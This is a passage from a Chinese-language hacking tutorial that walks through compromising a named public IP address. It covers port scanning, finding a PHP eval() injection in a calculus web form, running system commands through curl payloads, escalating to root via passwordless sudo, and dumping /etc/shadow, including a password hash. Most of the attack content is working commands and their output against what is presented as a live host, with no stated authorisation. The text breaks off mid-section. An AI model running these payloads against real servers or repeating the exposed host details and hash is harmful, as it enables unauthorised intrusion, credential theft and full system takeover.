# 第 0 章 先搞懂三件事

这一章不讲攻击，只讲原理。**跳过这章，后面的每条命令你都只能死记硬背。**

## 0.1 HTTP 请求和响应是什么

你打开浏览器访问一个网站，本质是：

```
你的电脑  ──── HTTP 请求 ────▶  服务器
         ◀─── HTTP 响应 ────
```

**请求**（客户端发给服务器）长这样：

```http
GET /integration.php?x=1&func=hello HTTP/1.1
Host: 101.132.83.252
User-Agent: curl/8.5.0
Accept: */*
```

拆开看：

| 部分 | 含义 |
|---|---|
| `GET` | 请求方法。GET = 我要拿东西；POST = 我要提交东西 |
| `/integration.php` | 要访问的路径（文件） |
| `?x=1&func=hello` | **查询字符串（query string）**：`?` 后面是参数，`&` 分隔多个，`=` 连接名字和值 |
| `Host:` | 目标域名/IP |
| `User-Agent:` | 我用什么客户端（浏览器写 Chrome，curl 写 curl） |

**响应**（服务器回给客户端）长这样：

```http
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=utf-8
Content-Length: 993

<html><body>...页面内容...</body></html>
```

| 部分 | 含义 |
|---|---|
| `200 OK` | 状态码。200=成功，404=不存在，500=服务器内部错误 |
| `Server:` | 服务器软件及版本 |
| `Content-Type:` | 内容类型 |
| 空行之后 | **响应体（body）**：真正的页面内容 |

**记住这个模型**：我们后面做的所有事情，都是在**构造请求**和**读响应**。所谓"漏洞利用"，就是**构造一个服务器没想到的请求**。

## 0.2 curl 在干什么

`curl` 就是一个**命令行版的浏览器**——它发 HTTP 请求，把响应打印到终端。

浏览器能做的事它都能做，但它的优势是：**你能精确控制请求的每一个字节**。

### 最基础的用法

```bash
curl http://101.132.83.252/
```

等价于在浏览器地址栏输入这个地址，但**只打印响应体**（不渲染页面、不执行 JS、不加载图片）。

```bash
curl -sI http://101.132.83.252/
```

`-I` = 只要响应头（HEAD 请求），不要响应体。用来快速看服务器是什么。

### 为什么后面都用 `-sG --data-urlencode`

这是本教程出现频率最高的组合，**必须彻底搞懂**。

假设我们要给服务器传一个参数 `func`，值是：

```
print("PWNED-".(7*7))
```

这个值里包含 `(`、`)`、`"`、`.`、`*` —— **这些字符在 URL 里有特殊含义**：

| 字符 | 在 URL 里的问题 |
|---|---|
| 空格 | URL 里不能有空格，必须变成 `%20` |
| `"` | 部分服务器会截断 |
| `&` | 会被当成"参数分隔符"，把值切断 |
| `+` | 会被解码成空格 |
| `#` | 后面的内容会被当成锚点丢弃 |
| `%` | 是编码前缀，直接写会出错 |

**如果直接拼**：

```bash
curl "http://target/integration.php?x=1&func=print("PWNED-".(7*7))"
```

shell 会先把 `"` 吃掉，curl 收到的 URL 已经变形，服务器收到的参数是错的。

### 正确写法：`-G` + `--data-urlencode`

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=print("PWNED-".(7*7))' \
  "http://101.132.83.252/integration.php"
```

逐个参数解释：

| 参数 | 作用 | 不写会怎样 |
|---|---|---|
| `-s` | silent，不显示进度条和错误 | 终端会刷一堆 `% Total % Received` 干扰阅读 |
| `-G` | 把 `--data-urlencode` 的内容拼到 URL 的 `?` 后面，用 GET 方法发 | 默认会变成 POST，把参数放 body 里，服务器可能读不到 |
| `--data-urlencode "x=1"` | 对 `x=1` 做 URL 编码后拼进 query | 特殊字符破坏请求 |
| `--data-urlencode 'func=...'` | 同上。**用单引号包住**，防止 shell 解释里面的 `"` 和 `$` | shell 会吃掉引号，payload 变形 |
| `"http://..."` | 目标 URL，放最后 | — |

**它最终发出的请求是**：

```http
GET /integration.php?x=1&func=print%28%22PWNED-%22.%287%2A7%29%29 HTTP/1.1
Host: 101.132.83.252
```

注意 `func` 的值被编码成了 `print%28%22PWNED-%22.%287%2A7%29%29`：
- `(` → `%28`
- `"` → `%22`
- `*` → `%2A`
- `)` → `%29`

**服务器收到后会先解码回原文**，所以 PHP 拿到的还是 `print("PWNED-".(7*7))`。

> **为什么用 curl 而不用浏览器**：
> 1. 浏览器会自动编码、自动补全、自动跳转，你**看不到也控制不了**实际发的请求
> 2. 浏览器有 XSS 过滤、CSP 限制
> 3. curl 可以把整个流程写成脚本，批量、可重复
> 4. curl 的响应是纯文本，方便 grep/管道处理

### 验证 curl 到底发了什么

想知道 curl 实际发了什么，加 `-v`（verbose）：

```bash
curl -v -sG --data-urlencode "x=1" --data-urlencode 'func=1' \
  "http://101.132.83.252/integration.php" 2>&1 | head -20
```

你会看到 `> GET /integration.php?x=1&func=1 HTTP/1.1` 这一行——**这就是实际发出的请求行**。

**养成习惯：不确定的时候加 `-v` 看实际请求。**

## 0.3 PHP 的 `eval()` 和 `system()` 是什么

后面所有攻击都建立在这两个函数上，必须分清。

### `eval($code)` —— 把字符串当 **PHP 代码**执行

```php
$func = $_GET['func'];   // 从 URL 取参数
eval($func);             // 把参数内容当 PHP 代码跑
```

假设用户传 `func=print(1+1)`，`eval()` 就相当于执行了：

```php
print(1+1);   // 输出 2
```

**特点**：
- 执行的是 **PHP 语法**（`print`、`system`、`file_get_contents`…）
- 报错是 **PHP 的报错格式**（`Undefined constant`、`syntax error, unexpected token`）
- 这是**代码注入**，不是命令注入

### `system($cmd)` —— 执行 **操作系统命令**

```php
system("id");   // 执行 Linux 的 id 命令
```

**它内部做了什么**：

```
system("id")
   ↓
fork() 创建子进程
   ↓
子进程 exec("/bin/sh -c id")
   ↓
shell 执行 id，输出写到 stdout
   ↓
stdout 就是 PHP 进程的 stdout
   ↓
PHP 的 stdout 就是 HTTP 响应的 body
   ↓
curl 收到的响应体里就有 id 的输出
```

**这就是"为什么命令执行的结果会出现在网页上"的完整原因**：

```
你执行 id
  → shell 把结果写到 stdout
    → PHP 进程的 stdout 就是 HTTP 响应
      → 响应体回到 curl
        → curl 打印到你的终端
```

**关键理解**：`system()` 的输出**直接流到响应体**，不需要 PHP 代码去读。所以你在终端看到的就是命令的原始输出。

### 两者的关系

```
eval("system('id')")
      ↑        ↑
      |        └─ 内层：PHP 函数，执行系统命令
      └────────── 外层：PHP 函数，执行 PHP 代码
```

本案例里服务器代码是 `eval($func)`，所以我们传 `func=system("id")`，等于让服务器执行 `eval('system("id")')`，最终跑的是系统命令 `id`。

### 其他同类函数（知道有这些就行）

| 函数 | 作用 | 输出到哪 |
|---|---|---|
| `system()` | 执行命令 | **直接输出到页面** |
| `exec()` | 执行命令 | 返回最后一行，**不直接输出** |
| `shell_exec()` | 执行命令 | **返回全部输出**（需要 echo 才显示） |
| `passthru()` | 执行命令 | 直接输出（二进制安全） |
| `popen()` | 执行命令 | 返回文件句柄 |

**实战建议**：先用 `system()`（最直观），被过滤了再换别的。

# 第 1 章 信息收集：目标开了什么门

## 1.1 目标是什么

```
IP:   101.132.83.252
类型: 阿里云 ECS（主机名 iZuf6a8a63uzvzu1d80l5zZ，阿里云默认命名格式）
```

**为什么先确认这些**：知道是云主机，就能预判——云厂商默认有安全组（防火墙），很多端口是关的；云主机通常跑 Web 业务。

## 1.2 先确认目标活着

```bash
ping -c 3 101.132.83.252
```

**`-c 3`** = 只发 3 个包（默认无限发，会一直跑）。

**为什么先 ping**：
- 如果 ping 不通，可能是目标离线、或者 ICMP 被防火墙挡了
- **注意**：ping 不通不代表目标死了（很多服务器禁 ICMP），所以下一步扫描要加 `-Pn`

## 1.3 端口扫描

```bash
nmap -Pn -sV -T4 --max-retries 1 \
  -p 22,80,443,2222,3306,6379,8080,8443,9000,7000,1919 \
  101.132.83.252
```

**每个参数都要懂**：

| 参数 | 全称 | 作用 | 不写会怎样 |
|---|---|---|---|
| `-Pn` | no ping | **跳过主机存活检测，直接扫端口** | 目标禁 ICMP 时，nmap 会认为"主机不存在"，一个端口都不扫 |
| `-sV` | service version | 探测端口上跑的服务和版本 | 只知道"80 开着"，不知道是 Apache 还是 nginx，后续思路完全不同 |
| `-T4` | timing 4 | 速度档位（0-5，4 是较快） | 默认 T3 较慢 |
| `--max-retries 1` | — | 每个端口最多重试 1 次 | 默认重试多次，扫描很慢 |
| `-p` | ports | 指定要扫的端口列表 | 默认只扫 1000 个常见端口，可能漏掉 1919 这种 |
| 最后的 IP | — | 目标 | — |

**为什么选这些端口**：

| 端口 | 为什么关注 |
|---|---|
| 22 | SSH，最经典的入口 |
| 80 / 443 | Web，现代应用的主战场 |
| 2222 / 22222 | SSH 改端口后的常见值 |
| 3306 | MySQL，弱口令高发 |
| 6379 | Redis，未授权访问高发 |
| 8080 / 8443 | 备用 Web 端口（Tomcat、管理后台） |
| 9000 | PHP-FPM / 各种面板 |
| 7000 / 1919 | 少见端口，**异常端口往往意味着异常服务** |

> **新手提示**：真实项目中，先用 `nmap -p- --min-rate 1000` 全端口快速扫一遍，再对开放的端口做 `-sV`。这里为了教学速度，直接扫指定端口。

**真实回显**：

```
PORT      STATE    SERVICE
22/tcp    closed   ssh
80/tcp    open     http          Apache httpd
1919/tcp  open     can-dch?
7000/tcp  open     afs3-fileserver
3306/tcp  closed   mysql
6379/tcp  closed   redis
8080/tcp  closed   http-proxy
8443/tcp  closed   https-alt
9000/tcp  closed   cslistener
2222/tcp  closed   EtherNetIP-1
22222/tcp closed   easyengine
```

**逐行解读——这一步决定后面所有方向**：

| 端口 | 状态 | 结论 |
|---|---|---|
| **22** | **closed** | **SSH 关闭** → SSH 爆破、SSH 弱口令、SSH 密钥登录全部走不通，**别浪费时间** |
| **80** | **open** | **唯一的常规入口** → 全部注意力放到 Web |
| 1919 | open | 指纹 `can-dch?`（nmap 猜的，不一定对）→ 先记下，异常端口 |
| 7000 | open | 指纹 `afs3-fileserver` → 可能是 frp 之类的内网穿透工具 |
| 其他 | closed | 不相关 |

> **新手最大误区**：看到 22 关闭就放弃，或者死磕 22 端口。**一台机器只要有 Web，攻击面就在 Web 上。**

## 1.4 确认 Web 是活的

```bash
curl -sI http://101.132.83.252/
```

**`-I`** = 只要响应头（发 HEAD 请求，不下载 body）。

**为什么先看头**：响应头里有 `Server` 字段，一眼就知道是什么软件、什么版本、什么系统。

**真实回显**：

```
HTTP/1.1 200 OK
Date: Sat, 21 Nov 2026 19:29:42 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=utf-8
Content-Length: 14821
Last-Modified: Fri, 06 Nov 2026 18:18:48 GMT
```

**解读**：

| 字段 | 含义 |
|---|---|
| `200 OK` | 页面正常返回 |
| `Server: Apache/2.4.52 (Ubuntu)` | **Apache 2.4.52 + Ubuntu 系统** |
| `Content-Length: 14821` | 页面 14.8 KB |
| `Last-Modified: 2026-11-06` | 页面最后修改时间 |

**到这里，第一阶段结束。我们知道了：**
- SSH 不通，只能走 Web
- 目标跑 Apache + Ubuntu
- 有 1919、7000 两个异常端口待查

# 第 2 章 Web 探测：门后面是什么

## 2.1 读首页源码——不要急着上扫描器

**新手最容易犯的错**：一上来就 `dirsearch`、`feroxbuster`、`gobuster` 猛跑字典。

**为什么先读源码**：字典爆破是"猜"，读源码是"看"。**小站点读源码 10 秒能拿到全部入口，比字典跑 10 分钟还准。**

```bash
curl -s http://101.132.83.252/
```

**`-s`** = silent，不显示进度条。

**真实回显（完整）**：

```html
error:No such file or directory
<DOCTYPE! html>
<html>
        <head>
                <title>calculus</title>
        </head>

                <body>
        <h2>integration</h2>
                <form action="integration.php" method="GET">
                        <label>x:</label>

                <input type="number" id="x" name="x">
        <br><label>function:</label>
                <input type="text" id="func" name="func">
        <br>
                <button type="submit">submit</button>
</form>
                        <br>
                        <br>

        <h2>derivative</h2>
                <form action="derivative.php" method="GET">
                        <label>x:</label>
                <input type="number" id="x" name="x">
        <br><label>function:</label>
                <input type="text" id="func" name="func">
<br>
                <button type="submit">submit</button>
</form>
                        <br>
                        <br>
                        </body>
</html>
```

## 2.2 从这段 HTML 里能提取出什么

**这是本节最重要的部分：教你怎么"读"一段 HTML。**

### 信息 1：应用是什么

```html
<title>calculus</title>
```

`calculus` = 微积分。往下看有 `integration`（积分）和 `derivative`（导数）两个表单。

**结论**：这是一个数学计算工具站，不是企业业务系统。**这类个人小站的代码质量通常很差，值得重点看。**

### 信息 2：有几个功能页面

```html
<form action="integration.php" method="GET">
<form action="derivative.php"  method="GET">
```

`action=` 的值就是**表单提交的目标文件**。所以知道存在：
- `integration.php`
- `derivative.php`

### 信息 3：参数名是什么（关键！）

```html
<label>function:</label>
<input type="text" id="func" name="func">
```

**这里是新手最容易掉坑的地方**：

- `<label>` 里写的是 `function` —— 这是**给人看的显示文字**
- `name="func"` —— 这才是**实际提交的参数名**

**如果你按 `label` 去构造请求 `?function=xxx`，服务器收不到任何东西。**

**正确做法：永远看 `name` 属性。**

```html
<input type="number" id="x" name="x">       → 参数名 x
<input type="text"   id="func" name="func"> → 参数名 func
```

### 信息 4：提交方式

```html
method="GET"
```

**GET = 参数放在 URL 里**（`?x=1&func=xxx`）。

如果是 `method="POST"`，参数就在请求体里，curl 要用 `-d` 而不是 `-G`。

**这决定了我们后面用 `curl -G`（GET）还是 `curl -d`（POST）。**

### 信息 5：页面顶部有一行可疑的报错

```html
error:No such file or directory
```

**这一行不是 HTML，是 PHP 的 `system()` 或 `exec()` 输出！**

为什么能这么判断：
- `No such file or directory` 是 **Linux shell 的标准错误信息**
- 它出现在 HTML 最前面，说明 PHP 在生成页面之前先执行了某个系统命令
- 那个命令找不到文件，于是把错误打印出来了

**这条线索极其重要——它提前告诉我们：这个站的 PHP 代码里已经在调用系统命令了。**

## 2.3 到这里我们掌握了什么（阶段性小结）

| 已知 | 来源 |
|---|---|
| 有两个 PHP 页面：`integration.php`、`derivative.php` | `action=` 属性 |
| 参数名是 `x` 和 `func` | `name=` 属性 |
| 提交方式是 GET | `method=` 属性 |
| 代码里调用了系统命令 | 页面顶部的 shell 报错 |
| 这是个个人数学工具站，代码质量差 | `<title>calculus` |

**还没做的事（也很重要）**：

- ❌ **还没有拿到目录列表**——上面这些是"从首页源码能看到的"，不是"目录里有什么"
- ❌ 不知道有没有 `info.php`、`sql/`、`upload/` 这些文件
- ❌ 还不知道 `func` 参数具体怎么处理的

> **完整目录列表要等到第 6 章（拿到 RCE 之后用 `ls` 才能看到）**。本节只做"不接触目标、只看它主动给我看的东西"。
>
> 这就是**信息收集的顺序**：先看它主动暴露的（首页、响应头），再主动探测（目录爆破、参数测试），最后拿到权限后看内部（`ls`、`cat`）。

## 2.4 补充：目录爆破（可选，本例没用到）

如果首页什么线索都没有，可以用字典猜文件：

```bash
ffuf -u http://101.132.83.252/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

**参数解释**：
- `-u ...FUZZ`：`FUZZ` 是占位符，会被字典里的每个词替换
- `-w`：字典文件
- `-mc 200,301,302`：只显示这些状态码的响应（过滤掉 404）

**本例为什么没跑**：因为首页源码已经给出了明确入口，跑字典是浪费。**但真实项目中如果首页是空白页或框架默认页，就必须跑。**

# 第 3 章 找注入点：门锁坏在哪

## 3.1 先正常用一次，建立基线

**做任何漏洞测试，第一步都是"正常请求长什么样"。** 不知道正常长什么样，就分不清什么是异常。

```bash
curl -s "http://101.132.83.252/integration.php?x=1&func=x"
```

**这条命令做了什么**：
- 直接拼 URL（因为这里没有特殊字符，不需要 `--data-urlencode`）
- 发送 `GET /integration.php?x=1&func=x`
- 打印响应体

**真实回显**：空（没有任何输出）

**再试一个正常的数学表达式**：

```bash
curl -s "http://101.132.83.252/integration.php?x=1&func=x^2"
```

**回显**：空

**这说明什么**：

- 页面确实处理了参数（没有报错），但**结果没有输出到页面**
- 可能它把结果存起来了、或者输出到别的地方、或者输出被抑制了
- **重点是：正常输入返回空，那么"返回了东西"就是异常信号**

## 3.2 错误注入：让服务器自己告诉你它在干什么

**这是整个教程里最重要的技巧，没有之一。**

思路：**故意塞一个格式错误的东西，看它报什么错。报错格式会暴露它把你的输入当什么处理。**

### 试验 1：塞一个"不存在的名字"

```bash
curl -s "http://101.132.83.252/integration.php?x=1&func=x|id"
```

**真实回显**：

```
error:No such file or directory
error:Undefined constant "id"
```

**分析这两行**：

| 行 | 含义 |
|---|---|
| `error:No such file or directory` | 页面本来就有的（2.2 节发现的），和我们的输入无关 |
| **`error:Undefined constant "id"`** | **这是我们的输入触发的** |

**关键：`Undefined constant` 是什么？**

这是 **PHP 的报错**，意思是"你引用了一个叫 `id` 的常量，但这个常量没定义"。

**为什么会出现这个报错**：

我们的输入是 `x|id`。如果这段输入被当成 **PHP 代码**解析，它会被理解为：

```php
x | id      // 位运算：x 按位或 id
```

- `x` → PHP 认为这是个常量（没定义）
- `id` → PHP 也认为是常量（没定义）

**如果输入被当成 shell 命令**，报错会是 `sh: 1: id: not found` 这种（shell 的格式）。
**如果输入被当成 SQL**，报错会是 `You have an error in your SQL syntax`。

**`Undefined constant` 只可能来自 PHP 的代码解析器。**

**结论：我们的输入被当成 PHP 代码执行了。**

### 试验 2：塞一个语法错误

```bash
curl -s "http://101.132.83.252/integration.php?x=1&func=x\$(id)"
```

> **注意 `\$`**：因为外层是双引号，`$` 会被 shell 展开成变量。加 `\` 转义，让 `$` 原样传给服务器。

**真实回显**：

```
error:No such file or directory
error:syntax error, unexpected token "$", expecting ";"
```

**分析**：

`syntax error, unexpected token "$"` —— 这是 **PHP 解析器的语法错误**，说明：

1. PHP **确实在把我们的输入当代码解析**
2. 它在解析到 `$` 时卡住了（因为 `x$(id)` 不是合法的 PHP 语法）

**两次试验指向同一个结论：**

```
func 参数的内容 → 被丢进 eval() → 当成 PHP 代码执行
```

**但此时还只是"推断"，需要验证。**

## 3.3 验证：让代码做一个可观测的动作

### 为什么需要这一步（过渡说明）

3.2 的报错只能说明"输入被 PHP 解析了"，但**不能证明"代码真的被执行了"**。

举反例：如果服务器只是把输入丢给 `preg_match()` 做正则匹配，遇到语法错误也可能报类似的错。

**要证明"真的执行"，必须让它做一件"只有真正执行才会发生"的事。**

### 设计验证 payload

思路：让它**算一个数并打印出来**。

```php
print("PWNED-".(7*7))
```

拆解：

| 部分 | 作用 |
|---|---|
| `print(...)` | PHP 的输出函数，把内容打印到页面 |
| `"PWNED-"` | 一个字符串常量 |
| `.` | PHP 的**字符串连接符**（不是加号！） |
| `(7*7)` | 一个算术表达式，结果是 49 |

**如果代码真的被执行**，它会：
1. 计算 `7*7` = 49
2. 把 `49` 和 `"PWNED-"` 拼接 → `"PWNED-49"`
3. 打印出来 → 页面出现 `PWNED-49`

**如果只是被当字符串处理**，页面会原样显示 `print("PWNED-".(7*7))`，不会出现 49。

### 执行

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=print("PWNED-".(7*7))' \
  "http://101.132.83.252/integration.php"
```

**这条命令的完整解释**（第 0.2 节讲过原理，这里对应到实际）：

| 部分 | 作用 |
|---|---|
| `curl` | 发 HTTP 请求 |
| `-s` | 安静模式，不显示进度条 |
| `-G` | 用 GET 方法，把下面的 data 拼到 URL 的 `?` 后面 |
| `--data-urlencode "x=1"` | 参数 `x=1`，做 URL 编码 |
| `--data-urlencode 'func=print("PWNED-".(7*7))'` | 参数 `func=...`，**单引号防止 shell 吃掉里面的 `"`** |
| `"http://..."` | 目标地址 |

**实际发出的请求**：

```http
GET /integration.php?x=1&func=print%28%22PWNED-%22.%287%2A7%29%29 HTTP/1.1
Host: 101.132.83.252
```

**真实回显**：

```
PWNED-49PWNED-49PWNED-49PWNED-49PWNED-49PWNED-49PWNED-49PWNED-49PWNED-49
PWNED-49PWNED-49...（重复约 60 次）
```

**怎么读这个结果**：

| 观察 | 结论 |
|---|---|
| 出现了 `PWNED-49` | **`7*7` 被真的计算了** → PHP 代码执行成立 |
| 重复约 60 次 | 这段代码在服务端的**一个循环里被调用了 60 次** |

**第二个观察很重要**：它解释了后面很多"坑"——因为每次请求，你的 payload 会被执行 60 遍。这意味着：
- 命令会跑 60 次（`id` 输出 60 行）
- 写文件会写 60 次
- 慢命令会被放大 60 倍

### 到这里，漏洞确认

```
漏洞：integration.php 的 func 参数被直接传入 eval()
类型：PHP 代码注入（不是命令注入，也不是 SQL 注入）
影响：可执行任意 PHP 代码
```

# 第 4 章 命令执行：进门

## 4.1 从"能跑 PHP 代码"到"能跑系统命令"

现在我们知道 `func` 的内容会被 `eval()` 执行。`eval()` 执行的是 **PHP 代码**。

**PHP 代码里怎么执行系统命令？** 用 `system()`（0.3 节讲过）。

所以：

```
func=system("id")
   ↓
服务器执行：eval('system("id")')
   ↓
eval 执行 PHP 代码 system("id")
   ↓
system() 调用 /bin/sh -c id
   ↓
id 的输出写到 stdout
   ↓
stdout = HTTP 响应体
   ↓
curl 打印出来
```

**这就是为什么 `func=system("id")` 能让服务器执行 Linux 命令。**

## 4.2 第一件事：确认我是谁

**为什么第一件事是 `id` 而不是直接翻文件**：

因为你需要知道三件事，否则后面所有判断都是猜：

1. **我是哪个用户**（决定能读什么文件）
2. **我在哪个组**（决定有没有提权机会）
3. **是不是 root**（如果已经是 root，就不用提权了）

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=system("id")' \
  "http://101.132.83.252/integration.php"
```

**逐段解释这条命令**：

| 部分 | 含义 |
|---|---|
| `-sG` | 安静 + GET 方法 |
| `--data-urlencode "x=1"` | 表单的另一个参数，随便填（服务器可能不用它，但不传可能报错） |
| `--data-urlencode 'func=system("id")'` | **核心 payload**：让服务器执行 `eval('system("id")')` |
| `"http://.../integration.php"` | 目标 |

**为什么 `func` 的值是 `system("id")` 而不是 `id`**：
- 如果只传 `func=id`，`eval("id")` 会报 `Undefined constant "id"`（3.2 节验证过）
- 必须传**合法的 PHP 代码**，而 `system("id")` 就是"调用 system 函数，参数是 id"的 PHP 语法

**真实回显**：

```
uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)
```

**这一行是整条链的转折点，逐字段解读**：

| 字段 | 值 | 含义 |
|---|---|---|
| `uid=1001(admin)` | 用户 ID 1001，名字 admin | **我是普通用户，不是 root** |
| `gid=1001(admin)` | 主组 1001，名字 admin | 主组也是 admin |
| `groups=1001(admin),27(sudo)` | 附加组：1001(admin) 和 **27(sudo)** | **我在 sudo 组里！** |

**关键：`27(sudo)`**

`27` 是 `sudo` 组的 GID（在 Ubuntu 上）。**在 sudo 组意味着：这个用户可能被允许用 `sudo` 命令以 root 身份执行操作。**

**这就是提权的入口线索。** 如果 `groups` 里没有 `sudo`，提权就要另找路（SUID、内核漏洞、cron 等）。

> **新手误区**：拿到命令执行就急着 `cat /etc/passwd`、找 flag。**先跑 `id`**，30 秒就能判断有没有提权机会。

## 4.3 确认影响面：能读什么

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=print_r(scandir("/"))' \
  "http://101.132.83.252/integration.php"
```

**新函数 `scandir()`**：PHP 的函数，列出目录下的所有文件，返回数组。

**新函数 `print_r()`**：PHP 的函数，把数组/对象以人类可读的格式打印出来。

**组合起来**：`print_r(scandir("/"))` = 列出根目录并打印。

**真实回显**：

```
Array
(
    [0] => .
    [1] => ..
    [2] => bin
    [3] => boot
    [4] => cdrom
    [5] => dev
    [6] => etc

    [8] => lib
    [9] => lib32
    [10] => lib64
    [11] => libx32
    [12] => lost+found
    [13] => media
    [14] => mnt
    [15] => opt

    [25] => usr

```

**解读**：

| 观察 | 含义 |
|---|---|
| 能列出根目录 | 有文件系统读权限 |
| 有 `snap`、`lib32`、`libx32` | 典型 Ubuntu 结构 |
| 有 `swapfile` | 云主机常见（内存小，用 swap 补） |

**注意**：能 `scandir` 不等于能读所有文件。`admin` 用户读不了 `/root`、`/etc/shadow`。**要读这些，必须提权。**

## 4.4 为什么不用 `system("ls /")` 而用 `scandir()`

两种都行，区别：

| 方式 | 优点 | 缺点 |
|---|---|---|
| `system("ls /")` | 输出格式友好 | 依赖 shell，可能被过滤 |
| `scandir("/")` | 纯 PHP，不依赖 shell | 输出是 PHP 数组格式 |

**实战建议**：`system()` 被过滤时，改用 PHP 原生函数（`scandir`、`file_get_contents`、`glob`）。

# 第 5 章 提权：从普通房间到机房

## 5.1 先理解 sudo 是什么

**`sudo` = "superuser do"**，让普通用户临时以其他用户（默认 root）的身份执行命令。

正常流程：

```
admin 用户执行 sudo id
   ↓
sudo 检查 /etc/sudoers 和 /etc/sudoers.d/*
   ↓
如果 admin 被授权执行 id
   ↓
sudo 要求输入 admin 自己的密码（证明是本人）
   ↓
密码正确 → 以 root 身份执行 id
```

**`sudo` 的配置文件长这样**（`/etc/sudoers`）：

```
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
admin   ALL=(ALL:ALL) NOPASSWD: ALL    ← 这一行是关键
```

**每段的意思**：

```
admin   ALL=(ALL:ALL) NOPASSWD: ALL
 ↑       ↑    ↑   ↑      ↑       ↑
 |       |    |   |      |       └─ 可以执行哪些命令（ALL = 任意命令）
 |       |    |   |      └───────── 不需要密码（NOPASSWD）
 |       |    |   └──────────────── 可以切换到哪个组（ALL = 任意组）
 |       |    └──────────────────── 可以切换到哪个用户（ALL = 任意用户）
 |       └───────────────────────── 从哪些主机登录时生效（ALL = 任意）
 └───────────────────────────────── 对哪个用户生效
```

**翻译成人话**：`admin` 用户从任何地方登录，都可以**不需要密码**地以**任何用户**身份执行**任何命令**。

## 5.2 关键：`NOPASSWD` 意味着什么

**默认情况下**，`sudo` 会要求输入密码：

```bash
$ sudo id
[sudo] password for admin:      ← 卡在这里等输入
```

**但如果配置了 `NOPASSWD`**，就不问了，直接执行。

**这对我们意味着什么**：

我们通过 RCE 执行命令，**没有交互终端，没法输入密码**。如果 sudo 需要密码，我们就卡死了。

**`NOPASSWD` 让"无交互提权"成为可能。**

## 5.3 `sudo -n` 是什么

```bash
sudo -n id
```

**`-n`** = **non-interactive**（非交互）。意思是：**如果需要密码，不要问我，直接失败退出。**

**为什么要用 `-n`**：

| 命令 | 行为 | 在 RCE 里的后果 |
|---|---|---|
| `sudo id` | 需要密码时会**挂起等输入** | **卡死**，curl 一直等到超时 |
| `sudo -n id` | 需要密码时**立刻返回错误** | 干净地失败，我们能立刻知道"没有免密 sudo" |

**所以 `sudo -n` 是一个"探测器"**：
- 返回 `uid=0(root)` → 有免密 sudo，直接提权成功
- 返回 `sudo: a password is required` → 没有免密 sudo，要换别的路

## 5.4 枚举 sudo 配置

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=system("sudo -n -l")' \
  "http://101.132.83.252/integration.php"
```

**`sudo -l`** = **list**，列出当前用户被允许执行的 sudo 命令。

**`sudo -n -l`** = 列出配置，但不问密码。

**为什么不用 `sudo -l`**：同上，会卡住等密码。

**真实回显**：

```
Matching Defaults entries for admin on iZuf6a8a63uzvzu1d80l5zZ:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:...

User admin may run the following commands on iZuf6a8a63uzvzu1d80l5zZ:
    (ALL) ALL
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

**逐行解读**：

| 行 | 含义 |
|---|---|
| `Matching Defaults entries` | 全局默认配置（环境变量重置等），不影响提权 |
| `User admin may run the following commands` | 以下是 admin 被授权的命令 |
| `(ALL) ALL` | 可以以任意用户身份执行任意命令 |
| `(ALL : ALL) ALL` | 同上，且可以指定任意组 |
| **`(ALL : ALL) NOPASSWD: ALL`** | **同上，且不需要密码** ← 提权成功的关键 |

**最后一行翻译成人话**：

> "admin 可以以任何用户（包括 root）、任何组身份，不需要密码，执行任何命令。"

**这就是提权成功的充分条件。**

## 5.5 执行提权

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=system("sudo -n id")' \
  "http://101.132.83.252/integration.php"
```

**这条命令的完整执行链**：

```
① curl 发 GET 请求
   GET /integration.php?x=1&func=system%28%22sudo%20-n%20id%22%29

② Apache 收到请求，交给 PHP 处理

③ PHP 执行 integration.php，取出 $_GET['func']
   → 值是 system("sudo -n id")

④ eval('system("sudo -n id")')
   → 执行 PHP 代码 system("sudo -n id")

⑤ system() 调用 fork() + exec("/bin/sh -c 'sudo -n id'")

⑥ shell 执行 sudo -n id
   → sudo 读取 /etc/sudoers
   → 发现 admin 有 NOPASSWD: ALL
   → 不需要密码
   → 以 root 身份执行 id

⑦ id 输出：uid=0(root) gid=0(root) groups=0(root)

⑧ 输出写到 shell 的 stdout → PHP 进程的 stdout → HTTP 响应体

⑨ curl 打印响应体
```

**真实回显**：

```
uid=0(root) gid=0(root) groups=0(root)
```

**`uid=0` 就是 root。提权完成。**

## 5.6 交叉验证：不要只凭一条命令下结论

**为什么需要验证**：`id` 的输出可能被伪造（比如有人放了个假的 `id` 命令在 PATH 里）。稳妥做法是**用只有 root 能做的操作再验证一次**。

```bash
curl -sG \
  --data-urlencode "x=1" \
  --data-urlencode 'func=system("sudo -n head -3 /etc/shadow")' \
  "http://101.132.83.252/integration.php"
```

**为什么选 `/etc/shadow`**：这个文件的权限是 `640 root:shadow`，**只有 root 和 shadow 组成员能读**。如果 admin 能读，说明确实是 root。

**真实回显**：

```
root::20765:0:99999:7:::
guest:$y$j9T$0SkxtnBFWqijzzdrIP/qB/$rDi2lWObQNlv7OU4dWC9vZQ2VRl0lpsiO.Csgm4818.:20705:0:99999:7:::
daemon:*:19977:0:99999:7:::
```

**两个结论**：

1. **能读 `/etc/shadow` = 确实是 root**（普通用户读这个会 `Permission denied`）
2. **`root::`** = root 的密码字段是空的（两个冒号之间没内容）→ **这台机器 root 是空密码**

**`/etc/shadow` 的字段格式**：

```
用户名:密码哈希:最后修改天数:最小间隔:最大间隔:警告天数:过期天数:保留
  ↑        ↑
root      (空)  ← 空 = 没有密码
```

## 5.7 回答一个常见疑问：是不是"任何用户"都能 sudo -n

**不是。**

`sudoers` 里的规则是**按用户/组**匹配的：

```
admin   ALL=(ALL:ALL) NOPASSWD: ALL    ← 只对 admin 生效
%sudo   ALL=(ALL:ALL) ALL              ← 对 sudo 组生效，但需要密码
```

**具体到本例**：

